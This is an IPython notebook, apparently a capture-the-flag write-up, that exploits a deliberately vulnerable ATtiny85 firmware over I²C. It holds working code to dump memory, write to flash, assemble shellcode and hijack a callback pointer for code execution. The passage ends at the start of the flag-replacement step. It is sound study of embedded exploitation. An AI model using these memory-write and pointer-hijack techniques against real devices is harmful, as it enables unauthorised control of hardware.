{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Capture The Flag Shitty Add-On Writeup\n",
    "\n",
    ">A CTF writeup by [Blake Burkhart](https://bburky.com)\n",
    "\n",
    "## CTF Details\n",
    "\n",
    "This IPython notebook is a solution for the [Capture The Flag Shitty Add-On](https://blog.wokwi.com/capture-the-flag-shitty-add-on/) by Uri Shaked. Read the blog post for full details of the CTF challenge.\n",
    "\n",
    "For this CTF we have an ATTiny85 accessible over I²C. The full source code for the firmware is available on GitHub. Memory can be [read](https://github.com/urish/ctf-shittyaddon/blob/6cc37e3f13ddab695859136189b64db712bb0cc6/ctf-firmware/ctf-firmware.ino#L54-L58) and [written](https://github.com/urish/ctf-shittyaddon/blob/6cc37e3f13ddab695859136189b64db712bb0cc6/ctf-firmware/ctf-firmware.ino#L47-L52) via I²C, and it's possible to flash program memory through the [main loop](https://github.com/urish/ctf-shittyaddon/blob/6cc37e3f13ddab695859136189b64db712bb0cc6/ctf-firmware/ctf-firmware.ino#L28-L45).\n",
    " We will need to iterface with an LED, and read and write program memory. Along the way we will need to gain code execution to complete some of the steps.\n",
    " \n",
    "There are a number of milestones to meet:\n",
    "\n",
    "1. [**Turn on the LED**](#Turn-on-the-LED) — Hopefully self-explanatory?\n",
    "2. [**The Secret Flag**](#The-Secret-Flag) — Find a string of text in memory.\n",
    "3. [**Blinking Rootkit**](#Blinking-Rootkit) — Make a the LED blink without additional I²C communication.\n",
    "4. [**Replace the Flag**](#Replace-the-Flag) — Replace the secret flag string with your name.\n",
    "\n",
    "The following resources will come in handy:\n",
    "\n",
    "* [Blog post and CTF description](https://blog.wokwi.com/capture-the-flag-shitty-add-on/)\n",
    "* [`ctf-firmware.ino` source for the CTF](https://github.com/urish/ctf-shittyaddon/blob/master/ctf-firmware/ctf-firmware.ino)\n",
    "* [ATtiny8x Datasheet](https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-2586-AVR-8-bit-Microcontroller-ATtiny25-ATtiny45-ATtiny85_Datasheet.pdf)\n",
    "\n",
    "## Setup\n",
    "\n",
    "I tested this solution with a Raspberry Pi 2 directly connected to a Digispark clone (an ATtiny85 board). The \"5v\" input of the Digispark was powered from the Pi's 3.3v pin to ensure the Digsparks's outputs safely operate at 3.3v. The [`ctf-firmware-1.0.0.hex`](https://github.com/urish/ctf-shittyaddon/releases/tag/1.0.0) file was flashed to the Digispark.\n",
    "\n",
    "The Pi must have I²C and SPI enabled in `/boot/config.txt`:\n",
    "\n",
    "    dtparam=i2c_arm=on,i2c_arm_baudrate=10000\n",
    "    dtparam=spi=on\n",
    "  \n",
    "I set the I²C baud rate to 10kHz to avoid errors. I think this may be due the fact that Raspberry Pis [don't support clock stretching](http://www.advamation.com/knowhow/raspberrypi/rpi-i2c-bug.html) but the [ATtiny85 and the TinyWire library may allow it](https://github.com/lucullusTheOnly/TinyWire/issues/1). In other words, the slow ATtiny85 may not send all the data fast enough with the Pi's default 100kHz baud rate, set it to something slow like 10kHz. If you don't change the baud rate you will sometimes get \"OSError: [Errno 121] Remote I/O error\" and may see corrupted/failed reads or writes. At first I had 40kHz working, but it quit working some reason. I found 10kHz to be completely stable, but annoyingly slow.\n",
    "\n",
    "Also, if the AVR ISP interface is connected to the Pi's SPI pins the Digispark can be flashed directly from the Pi with `avrdude`'s linuxspi protocol:\n",
    "\n",
    "    avrdude -v -pattiny85 -clinuxspi -b14400 -P /dev/spidev0.0 -U flash:w:ctf-firmware-1.0.0.hex \n",
    "    avrdude -v -pattiny85 -clinuxspi -b14400 -P /dev/spidev0.0 -Uefuse:w:0xfe:m -Uhfuse:w:0xdf:m -Ulfuse:w:0xe2:m\n",
    "    \n",
    "Don't connect the Pi to the Digispark's I²C and SPI at the same time, they share pins and things will go wrong.\n",
    "\n",
    "Here is a photo of my Digispark connected to my Pi. The yellow and green wires connect I²C from the Pi to the Digispark. The disconnected SPI wires can be temporarily connected to reflash the Digispark. The black wire from pin 25 of the Pi is used by `avrdude` for reset. And with Wi-Fi on the Pi I can walk around with my laptop and CTF with ease.\n",
    "\n",
    "<img src=\"images/wiring-photo.jpg\" style=\"width:100%; max-width: 40em\">\n",
    "\n",
    "## I²C Read/Write\n",
    "\n",
    "Review the source code for the CTF and you will find `onI2CReceive()` and `onI2CRequest()` handling I²C communication. During `setup()` the I²C address is configured to 0x23 and these functions are registered to run on receiving and on request for I²C data.\n",
    "\n",
    "On an I²C read, two bytes are returned by the firmware: the lower byte of the 16-bit `target` address and the byte at that address in memory.\n",
    "\n",
    "When writing, the first byte is used to set lower byte of the `target` address. The upper byte is always set to zero because only one byte is being written to a `uint16_t` sized variable. The remainder of the bytes are written to memory sequentially, starting at the `target` pointer address.\n",
    "\n",
    "A write with zero data bytes may be performed before a read to set the target address of the read.\n",
    "\n",
    "Define a pair of `i2c_write()` and `i2c_read()` functions. These functions also track the full 16-byte target address in a `current_target` global variable."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from smbus2 import SMBus, i2c_msg\n",
    "from io import BytesIO\n",
    "\n",
    "CTF_I2C_ADDR = 0x23\n",
    "\n",
    "current_target = None\n",
    "\n",
    "\n",
    "def i2c_write(target, data=[]):\n",
    "    global current_target\n",
    "\n",
    "    with SMBus(1) as bus:\n",
    "        msg = i2c_msg.write(CTF_I2C_ADDR, [target, *data])\n",
    "        bus.i2c_rdwr(msg)\n",
    "    current_target = target + len(data)\n",
    "\n",
    "\n",
    "def i2c_read(target=None, count=1):\n",
    "    global current_target\n",
    "\n",
    "    with BytesIO() as f:\n",
    "        with SMBus(1) as bus:\n",
    "            # If provided, change target by writing the target address, but no data bytes\n",
    "            if target is not None:\n",
    "                msg = i2c_msg.write(CTF_I2C_ADDR, [target])\n",
    "                bus.i2c_rdwr(msg)\n",
    "                current_target = target\n",
    "\n",
    "            for i in range(count):\n",
    "                msg = i2c_msg.read(CTF_I2C_ADDR, 2)\n",
    "                bus.i2c_rdwr(msg)\n",
    "                target, data = msg\n",
    "                f.write(bytes([data]))\n",
    "\n",
    "                # If the returned target byte is ever not what we expect, raise an error\n",
    "                if current_target is not None:\n",
    "                    assert target == current_target & 0xFF\n",
    "                    current_target += 1\n",
    "                else:\n",
    "                    print(\"No current_target, setting target:\", hex(target))\n",
    "                    current_target = target\n",
    "\n",
    "        f.seek(0)\n",
    "        return f.read()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Some quick testing. Manually set the target to 0x00 and read one byte:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\"'"
      ]
     },
     "execution_count": null,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "i2c_write(0x00)\n",
    "i2c_read()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Read 4 bytes starting at 0x00:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x02\\x00\\x00\\x00'"
      ]
     },
     "execution_count": null,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "i2c_read(target=0x00, count=4)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Write 6 bytes starting at 0x00. Be careful, you might corrupt memory and need to reset the ATtiny."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# i2c_write(0x00, b\"FOOBAR\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Turn on the LED\n",
    "\n",
    "First, to write to an output pin the the pin must be configured as an output on AVR devices. The datasheet describes how the Port B Data Direction Register (DDRB) can be configured to use PB1 as an output. Setting DDB1 (bit 1) of DDRB enables output.\n",
    "\n",
    "Then, writing to PORTB will change the value of the pin from low to high. \n",
    "\n",
    "The datasheet describes how these I/Os are accessible:\n",
    "\n",
    "> The I/O memory space contains 64 addresses for CPU peripheral functions as Control Registers, SPI, and other I/O functions. The I/O memory can be accessed directly, or as the Data Space locations following those of the Register File, 0x20 - 0x5F.\n",
    "\n",
    "And later describes how to access them by address:\n",
    "\n",
    "> All ATtiny25/45/85 I/Os and peripherals are placed in the I/O space. All I/O locations may be accessed by the LD/LDS/LDD and ST/STS/STD instructions, transferring data between the 32 general purpose working registers and the I/O space. I/O Registers within the address range 0x00 - 0x1F are directly bit-accessible using the SBI and CBI instructions. In these registers, the value of single bits can be checked by using the SBIS and SBIC instructions. Refer to the instruction set section for more details. When using the I/O specific commands IN and OUT, the I/O addresses 0x00 - 0x3F must be used. When addressing I/O Registers as data space using LD and ST instructions, 0x20 must be added to these addresses. \n",
    "\n",
    "Great, so we can add 0x20 to the address of PORTB and DDRB to access them by memory address. Using our I²C read/write functions we can configure these I/Os in memory."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# The 0x20 base is called __SFR_OFFSET in avr-libc, which I used for reference\n",
    "SFR_OFFSET = 0x20\n",
    "# Register addresses can be found in the datasheet\n",
    "PORTB_ADDR = 0x18 + SFR_OFFSET\n",
    "DDRB_ADDR = 0x17 + SFR_OFFSET\n",
    "\n",
    "# Read the current value of DDRB\n",
    "(ddrb,) = i2c_read(DDRB_ADDR)\n",
    "\n",
    "# Configure LED as an output pin:\n",
    "# Enable DDB1 for output on PB1. This allows writing to pin 6\n",
    "# of the ATtiny, the pin that the LED is connected to.\n",
    "ddrb |= 1 << 1\n",
    "\n",
    "# Set DDRB on the board\n",
    "i2c_write(DDRB_ADDR, [ddrb])\n",
    "\n",
    "# Set all output bits in PORTB to turn on the LED\n",
    "# i2c_write(PORTB_ADDR, [0xff])\n",
    "(portb,) = i2c_read(PORTB_ADDR)\n",
    "portb |= 1 << 1\n",
    "i2c_write(PORTB_ADDR, [portb])\n",
    "\n",
    "# The actual CTF board is active-high unlike the Digispark.\n",
    "# To turn the LED on on it set PORTB to 0x00.\n",
    "# i2c_write(PORTB_ADDR, [0x00])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The Secret Flag\n",
    "\n",
    "Dump the entire flash (plus some, it loops if you read too much?) and search for the flag with a regex on the bytes.\n",
    "\n",
    "A woefully unknown feature of Python 3's `re` module is that it supports matching on 8-bit strings (`bytes` objects). This is extremely convenient for analyzing binary data. Simply pass the pattern as `bytes` instead of a `str` to `re.search()` when matching on `bytes`.\n",
    "\n",
    "We know the flag starts with \"$FLAG:\" by reviewing the source code. Dump the flash and search for a null terminated string starting with this prefix."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "dump = i2c_read(target=0x00, count=0x10000)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "$FLAG:you_found_it!!! :-)\n",
      "Flag address: 0x801e\n"
     ]
    }
   ],
   "source": [
    "import re\n",
    "\n",
    "flag_match = re.search(b\"\\$FLAG:.*?(?=\\x00)\", dump)\n",
    "flag = flag_match.group(0)\n",
    "print(flag.decode(\"ascii\"))\n",
    "\n",
    "flag_address = flag_match.start()\n",
    "print(\"Flag address:\", hex(flag_address))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Read from High Memory Faster\n",
    "\n",
    "It's annoying that we can't set the `target` to a full two byte `uint16_t` value and address all of memory. However, it's possible to find the upper byte of the `target` pointer in memory and set it directly. If we set it to 0x7f and start reading bytes, we should be able to read from higher memory addresses directly.\n",
    "\n",
    "I compiled the CTF source code using [PlatformIO](https://platformio.org/) with debugging symbols enabled, and took the compiled elf and opened it with the [Ghidra](https://ghidra-sre.org/) disassembler. After confirming that my recompilation was similar enough, I found the `target` pointer at address `mem:0064` in Ghidra by filtering the symbol list to some interesting addresses:\n",
    "\n",
    "<img src=\"images/symbols.png\" style=\"width:100%; max-width: 50em\">\n",
    "\n",
    "These addresses can also be found with `readelf`, but it's not obvious each variable is a code or data address. You have to somehow figure out that memory is at 0x800000 and code starts at zero.\n",
    "\n",
    "```\n",
    "$ readelf -s firmware.elf | grep -E 'flag|flash|target'\n",
    "    21: 00800064     2 OBJECT  LOCAL  DEFAULT    3 target\n",
    "    40: 00800060     2 OBJECT  LOCAL  DEFAULT    2 flash_value\n",
    "    41: 0000001e    13 OBJECT  LOCAL  DEFAULT    1 _ZL4flag\n",
    "    42: 00800062     2 OBJECT  LOCAL  DEFAULT    2 flash_addr\n",
    "```\n",
    "\n",
    "As a first test I tried writing a byte to address 0x64 and as expected the assert inside `i2c_read()` triggered, because the target pointer address was changed in memory. If we update `current_target` too, we can change the `target` pointer via address 0x64 and then start reading at the written address."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'5'"
      ]
     },
     "execution_count": null,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "i2c_write(0x64, [0x00])\n",
    "current_target = 0x00\n",
    "i2c_read()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, set the high byte to read from higher memory addresses. A problem is that if we set address 0x65 to 0x80 we will then start reading at 0x8066. We won't be able to control the lower byte. If we decrease the value we write to the high byte, we can just read some extra data until we get to the desired lower byte range."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Flag address 0x801e == 0x801e\n"
     ]
    }
   ],
   "source": [
    "i2c_write(0x65, [0x7F])\n",
    "current_target = 0x7F66\n",
    "dump2 = i2c_read(count=0x100)\n",
    "\n",
    "match = re.search(b\"\\$FLAG:.*?(?=\\x00)\", dump2)\n",
    "print(f\"Flag address {hex(flag_address)} == {hex(match.start() + 0x7f66)}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define a new `i2c_read_high()` function to implement this new read logic precisely:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'$FLAG:you_found_it!!! :-)'"
      ]
     },
     "execution_count": null,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "TARGET_HI_ADDR = 0x65\n",
    "\n",
    "\n",
    "def i2c_read_high(target, count=1):\n",
    "    global current_target\n",
    "\n",
    "    target_hi = target >> 8\n",
    "    # Deliberately undershoot the target address by decrementing target_hi by one\n",
    "    target_hi -= 1\n",
    "    i2c_write(TARGET_HI_ADDR, [target_hi])\n",
    "    current_target = (target_hi << 8) | (TARGET_HI_ADDR + 1)\n",
    "    # Read and discard the returned bytes until we get to the desired target address\n",
    "    i2c_read(count=target - current_target)\n",
    "\n",
    "    return i2c_read(count=count)\n",
    "\n",
    "\n",
    "# A quick test:\n",
    "i2c_read_high(flag_address, count=len(flag))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Blinking Rootkit\n",
    "\n",
    "While there are many ways to make the LED blink, I chose to configure Timer/Counter1 to output to PB1. This way it is possible to make the LED blink without yet gaining actual code execution.\n",
    "\n",
    "The datasheet describes how the OC1A output from Timer/Counter1 can be sent to PB1:\n",
    "\n",
    "> **Port B, Bit 1 – MISO/AIN1/OC0B/OC1A/DO/PCINT1**\n",
    "> * OC1A: Output Compare Match output: The PB1 pin can serve as an external output for the Timer/Counter1 Compare Match B when configured as an output (DDB1 set). The OC1A pin is also the output pin for the PWM mode timer function.\n",
    "\n",
    "Read the datasheet's register description for TCCR1 for full details and then configure the TCCR1 timer. The LED will blink indefinitely without further input. If the ATtiny is reset the LED will stop blinking, this only changes the in-memory configuration of the timer and output pins."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "TCCR1_ADDR = 0x30 + SFR_OFFSET\n",
    "\n",
    "# Ensure DDRB is still configured to output PB1\n",
    "(ddrb,) = i2c_read(DDRB_ADDR)\n",
    "ddrb |= 0b00000010\n",
    "i2c_write(DDRB_ADDR, [ddrb])\n",
    "\n",
    "# Configure TCCR1:\n",
    "#   Set bit 7 clear timer on compare match\n",
    "#   Set bit 6 to 0 to leave PWM disabled\n",
    "#   Set bits 5:4 to 01 to toggle PB1/OC1A (the LED)\n",
    "#   Set bits 3:0 to 1111 for prescaler/16384 (as slow as possible)\n",
    "tccr1 = 0b1_0_01_1111\n",
    "i2c_write(TCCR1_ADDR, [tccr1])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Code execution\n",
    "\n",
    "Arguably that solution to flash the LED was cheating, after all the challenge said: \"Find a way to remotely execute code on the ATtiny85 chip, making the LED blink in a constant rate.\" While Uri decided my solution was sufficient, let's try to figure out how to gain code execution. We will need it anyway for the final problem.\n",
    "\n",
    "AVR microcontrollers use a modified Harvard architecture which makes gaining code execution difficult. That is, code and data are completely separate. You can't simply write some shellcode into RAM and jump to it. All code must be executed from program memory. Thankfully, there's some weird logic going on in `loop()` that will allow us to write to program memory.\n",
    "\n",
    "If we look at `loop()` we see that if we configure `flash_addr` and `flash_value` appropriately our data will be flashed into program memory. `flash_value` is actually a pointer to data that will be flashed into program memory.\n",
    "\n",
    "First, we need to write the data we want to flash somewhere into memory. The range of addresses 0x60–0x25F point to SRAM of the ATtiny85. The stack starts at the end of SRAM at 0x25F and grows downwards. All global variables are placed at in memory starting at 0x60. The safest place to write a large piece of data is after all the global variables.\n",
    "\n",
    "It turns out we can't write more than 30 bytes through the `i2c_write()` function or something breaks and crashes. Define a new `i2c_write_big()` function that can write large amounts of data into memory."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": null,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Found by trial and error, writes above this size seem to fail.\n",
    "# I suspect this is related to TinyWire having TWI_RX_BUFFER_SIZE\n",
    "# set to 32 bytes.\n",
    "CHUNK_SIZE = 30\n",
    "\n",
    "# This address was found by analyzing the .hex file in Ghidra.\n",
    "# This address is one past the last global variable in memory.\n",
    "FREE_MEMORY_ADDR = 0xC5\n",
    "\n",
    "\n",
    "def chunks(seq, size):\n",
    "    # Split the sequence into chunks of the specified size.\n",
    "\n",
    "    # Make the largest chunk full sized and the smallest chunk\n",
    "    # come from the beginning of the sequence. This allows\n",
    "    # writing as large of data as possible deep into memory while\n",
    "    # using a one byte address.\n",
    "\n",
    "    # That is, chunks(range(15), 10) should return something like:\n",
    "    #   [[0, 1, 2, 3, 4] [5, 6, 7, 8, 9, 10, 11, 12, 13, 14]]\n",
    "    # This function actually has the chunks reversed because that\n",
    "    # was easier though.\n",
    "\n",
    "    start = len(seq) - size\n",
    "    while start >= 0:\n",
    "        yield start, seq[start : start + size]\n",
    "        start -= size\n",
    "    if start + size != 0:\n",
    "        yield 0, seq[: start + size]\n",
    "\n",
    "\n",
    "def i2c_write_big(target, data):\n",
    "    for offset, data_chunk in chunks(data, CHUNK_SIZE):\n",
    "        i2c_write(target + offset, data_chunk)\n",
    "\n",
    "\n",
    "# Test writing a large amount of data into memory\n",
    "test_data = b\"This is a test.\".ljust(64)\n",
    "i2c_write_big(FREE_MEMORY_ADDR, test_data)\n",
    "i2c_read(FREE_MEMORY_ADDR, 64) == test_data"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If `flash_value` is set to a value such as 0x9000, the address will be converted to the program memory address 0x1000 and the flash page containing that address (0x1000 to 0x1040) will be erased.\n",
    "\n",
    "If `flash_value` is set to 0x1000 the data from `flash_addr` will be written to flash at the program memory address 0x1000. `flash_addr` is a pointer to the data that will be flashed into program memory.\n",
    "\n",
    "Data can only be flashed to program memory in chunks of `SPM_PAGESIZE` which is 64. Define a function `flash_memory()` that can flash any amount of data into program memory."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Flashing 64 bytes to 0x1000... Verifying... Success.\n",
      "Flashing 128 bytes to 0x1200.... Verifying... Success.\n"
     ]
    }
   ],
   "source": [
    "SPM_PAGESIZE = 64\n",
    "FLASH_VALUE_ADDR = 0x60\n",
    "FLASH_ADDR_ADDR = 0x62\n",
    "\n",
    "\n",
    "def flash_memory_small(flash_addr, data):\n",
    "    # Only a full page may be flashed\n",
    "    assert len(data) == SPM_PAGESIZE\n",
    "    # The address must start at the beginning of a  page\n",
    "    assert flash_addr % SPM_PAGESIZE == 0\n",
    "    # Test if we can write to the program memory address\n",
    "    assert flash_addr & 0x1FFF >= 0x800\n",
    "\n",
    "    # Place the data we want to write into memory\n",
    "    i2c_write_big(FREE_MEMORY_ADDR, data)\n",
    "    # Write the address of our data into the flash_value pointer\n",
    "    i2c_write(FLASH_VALUE_ADDR, int.to_bytes(FREE_MEMORY_ADDR, 2, \"little\"))\n",
    "    # Erase flash page\n",
    "    i2c_write(FLASH_ADDR_ADDR, int.to_bytes(flash_addr | 0x8000, 2, \"little\"))\n",
    "    # Write the program memory address to trigger flashing\n",
    "    i2c_write(FLASH_ADDR_ADDR, int.to_bytes(flash_addr, 2, \"little\"))\n",
    "\n",
    "\n",
    "# The above function can only process data of exactly SPM_PAGESIZE, this\n",
    "# will chunk the input data and flash all of it.\n",
    "def flash_memory(address, data):\n",
    "\n",
    "    # Pad data to a multiple of SPM_PAGESIZE\n",
    "    data = bytes(data)\n",
    "    data_padded = data.ljust(len(data) - len(data) % -SPM_PAGESIZE)\n",
    "\n",
    "    print(f\"Flashing {len(data_padded)} bytes to 0x{address:04x}..\", end=\"\")\n",
    "    for offset, chunk in chunks(data_padded, SPM_PAGESIZE):\n",
    "        print(\".\", end=\"\")\n",
    "        chunk_address = address + offset\n",
    "        flash_memory_small(address + offset, chunk)\n",
    "\n",
    "    # Verify the write, it fails sometimes\n",
    "    print(\" Verifying...\", end=\"\")\n",
    "    assert i2c_read_high(address | 0x8000, len(data_padded)) == data_padded\n",
    "    print(\" Success.\")\n",
    "\n",
    "\n",
    "# Test:\n",
    "flash_memory(0x1000, b\"This is another test.\")\n",
    "flash_memory(0x1200, range(65))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, this is mostly overkill, but I built an easy to use shellcode assembler with IPython integration. Using `avr-gcc` and `avr-objcopy` we can compile an assembly fragment into binary. It was very useful while iteratively testing and writing assembly.\n",
    "\n",
    "You can either preview the assembled binary of your code:\n",
    "\n",
    "```\n",
    "%%shellcode --dissasembly\n",
    "sbi _SFR_IO_ADDR(DDRB), 1\n",
    "sbi _SFR_IO_ADDR(PORTB), 1\n",
    "```\n",
    "\n",
    "Or assemble and flash directly into memory:\n",
    "\n",
    "```\n",
    "%%shellcode --flash=0x1000\n",
    "sbi _SFR_IO_ADDR(DDRB), 1\n",
    "sbi _SFR_IO_ADDR(PORTB), 1\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import subprocess\n",
    "from tempfile import TemporaryDirectory\n",
    "from pathlib import Path\n",
    "\n",
    "import IPython\n",
    "from IPython.core.magic import register_cell_magic\n",
    "from IPython.core.magic_arguments import argument, magic_arguments, parse_argstring\n",
    "\n",
    "\n",
    "def run_proccess(args, cwd):\n",
    "    # IPython notebooks won't show stdout from subprocesses.\n",
    "    # Capture and print it manually.\n",
    "    proc = subprocess.run(\n",
    "        args, cwd=cwd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n",
    "    )\n",
    "    output = proc.stdout.decode().strip()\n",
    "    if output:\n",
    "        print(output)\n",
    "    proc.check_returncode()\n",
    "\n",
    "\n",
    "@register_cell_magic\n",
    "@magic_arguments()\n",
    "@argument(\"--flash\", type=lambda x: int(x, 0))  # allow hex\n",
    "@argument(\"-d\", \"--disassemble\", action=\"store_true\")\n",
    "def shellcode(line, cell):\n",
    "    args = parse_argstring(shellcode, line)\n",
    "\n",
    "    with TemporaryDirectory() as directory:\n",
    "        with Path(directory, \"shellcode.S\").open(\"w\") as f:\n",
    "            f.write(\n",
    "                \"\"\"\n",
    "                #include <avr/io.h>\n",
    "                .section .text\n",
    "                    .global main\n",
    "                main:\n",
    "                    rjmp    .-2\n",
    "                .section .shellcode-section\n",
    "                    .global shellcode\n",
    "                shellcode:\n",
    "                \"\"\"\n",
    "            )\n",
    "            f.write(cell)\n",
    "\n",
    "        run_proccess(\n",
    "            [\n",
    "                \"avr-gcc\",\n",
    "                \"-Wall\",\n",
    "                \"-Os\",\n",
    "                \"-DF_CPU=1000000\",\n",
    "                \"-mmcu=attiny85\",\n",
    "                \"shellcode.S\",\n",
    "                \"-o\",\n",
    "                \"shellcode.elf\",\n",
    "            ],\n",
    "            cwd=directory,\n",
    "        )\n",
    "\n",
    "        if args.disassemble:\n",
    "            run_proccess(\n",
    "                [\n",
    "                    \"avr-objdump\",\n",
    "                    \"--disassemble\",\n",
    "                    \"--section=.shellcode-section\",\n",
    "                    \"shellcode.elf\",\n",
    "                ],\n",
    "                cwd=directory,\n",
    "            )\n",
    "            return\n",
    "\n",
    "        run_proccess(\n",
    "            [\n",
    "                \"avr-objcopy\",\n",
    "                \"--dump-section\",\n",
    "                \".shellcode-section=shellcode.bin\",\n",
    "                \"shellcode.elf\",\n",
    "            ],\n",
    "            cwd=directory,\n",
    "        )\n",
    "\n",
    "        shellcode_bytes = Path(directory, \"shellcode.bin\").read_bytes()\n",
    "\n",
    "        if args.flash:\n",
    "            flash_memory(args.flash, shellcode_bytes)\n",
    "            return\n",
    "\n",
    "        # Just print the hex by default\n",
    "        print(shellcode_bytes.hex())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now flash some shellcode to blink the LED."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Flashing 64 bytes to 0x1000... Verifying... Success.\n"
     ]
    }
   ],
   "source": [
    "%%shellcode --flash=0x1000\n",
    "; Configure Timer1 to blink the LED\n",
    "sbi        _SFR_IO_ADDR(DDRB), 1\n",
    "ldi        ZL, 0b10011000                ; Blink really fast\n",
    "out        _SFR_IO_ADDR(TCCR1), ZL"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "There aren't too many ways to jump to our code and gain code execution on an AVR microcontroller. The first option would be to try replacing a return address on the stack. But this isn't a viable option because the stack starts at 0x25F and grows downward. Typically none of the stack will accessible with a one byte address:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Stack points to: 0x0248\n"
     ]
    }
   ],
   "source": [
    "SP_ADDR = 0x3D + SFR_OFFSET\n",
    "\n",
    "sp = int.from_bytes(i2c_read(SP_ADDR, 2), \"little\")\n",
    "print(f\"Stack points to: 0x{sp:04x}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Another option is to see if we can find an `ijmp` or `icall` in the firmware that we can control the address of. I used Ghidra and searched for the `ijmp` instruction mnemonic and analyzed which ones could be useful.\n",
    "\n",
    "In the source code, a function pointer is registered as an  I²C on request callback like this: `TinyWire.onRequest(onI2CRequest)`. This address gets written to a global variable and `TinyWire` invokes it with an `ijmp` when an I²C request is triggered. If we replace the address with that of our shellcode, we can invoke it by sending an I²C request."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ignoring I2C read error.\n"
     ]
    }
   ],
   "source": [
    "ONREQUEST_ADDR = 0x0095\n",
    "ONREQUEST_ORIGINAL = 0x0056\n",
    "\n",
    "\n",
    "def i2c_dummy_read(count=1):\n",
    "    with SMBus(1) as bus:\n",
    "        msg = i2c_msg.read(CTF_I2C_ADDR, count)\n",
    "        bus.i2c_rdwr(msg)\n",
    "        print(\"Got I2C response:\", bytes(msg).hex())\n",
    "\n",
    "\n",
    "def execute_shellcode(address, read_count=1):\n",
    "    global current_target\n",
    "    i2c_write(ONREQUEST_ADDR, int.to_bytes(address, 2, \"little\"))\n",
    "    try:\n",
    "        i2c_dummy_read(read_count)\n",
    "    except:\n",
    "        print(\"Ignoring I2C read error.\")\n",
    "\n",
    "    # The device should have errored and reset now, see if it still works:\n",
    "    try:\n",
    "        i2c_read()\n",
    "    except AssertionError:\n",
    "        current_target = None\n",
    "    except:\n",
    "        print(\"I2C read no longer works, please reset the device.\")\n",
    "\n",
    "\n",
    "# Run execute our shellcode\n",
    "execute_shellcode(0x0800)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Some reason using the expected address of 0x1000 wasn't working so I used 0x0800. Using an earlier address works because empty program memory contains the value 0xffff repeated, which [can be interpreted as `sbrs r31, 7`](https://www.avrfreaks.net/forum/executing-ff-or-00-what-happens) and functions as a NOP sled."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Replace the Flag\n",
    "\n",
    "Because we can only write whole pages, first create a copy of the page containing the flag and replace the flag with my name."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "flag_page = flag_address & ~(SPM_PAGESIZE - 1)\n",
